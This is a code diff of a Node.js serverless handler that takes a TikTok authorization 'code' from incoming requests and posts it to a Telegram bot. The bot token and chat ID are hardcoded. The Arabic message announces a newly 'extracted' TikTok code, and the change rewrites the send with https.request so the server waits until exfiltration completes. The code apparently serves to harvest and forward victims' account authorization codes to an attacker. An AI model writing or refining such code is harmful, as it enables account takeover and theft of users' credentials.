@@ -1,3 +1,5 @@
+const https = require('https');
+
 const TELEGRAM_TOKEN = '8764995786:AAH6TdLNgNP7n13JKr7M8GSFlgW3Sr87dXE';
 const TELEGRAM_CHAT_ID = '7644255708';
 
@@ -18,23 +20,40 @@ module.exports = async (req, res) => {
     const params = new URLSearchParams(queryString);
     const code = params.get('code');
 
-    // إذا وُجد كود، نجبر السيرفر على انتظاره حتى يرسل للتليجرام بنجاح
     if (code) {
       const messageText = `🎯 تم استخراج رمز تيك توك جديد!\n\n🔑 الـ Code هو:\n${code}\n\n⚙️ المحرك: AWR Central`;
       
-      try {
-        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
-        await fetch(telegramUrl, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: TELEGRAM_CHAT_ID,
-            text: messageText
-          })
+      const postData = JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: messageText
+      });
+
+      const options = {
+        hostname: 'api.telegram.org',
+        port: 443,
+        path: `/bot${TELEGRAM_TOKEN}/sendMessage`,
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Content-Length': Buffer.byteLength(postData)
+        }
+      };
+
+      // إرسال الطلب بشكل متزامن وإجبار السيرفر على الانتظار
+      await new Promise((resolve) => {
+        const telegramReq = https.request(options, (telegramRes) => {
+          telegramRes.on('data', () => {});
+          telegramRes.on('end', () => resolve());
         });
-      } catch (err) {
-        console.error('Telegram Error:', err);
-      }
+
+        telegramReq.on('error', (error) => {
+          console.error('Telegram Error:', error);
+          resolve();
+        });
+
+        telegramReq.write(postData);
+        telegramReq.end();
+      });
     }
 
     res.setHeader('Content-Type', 'application/json');
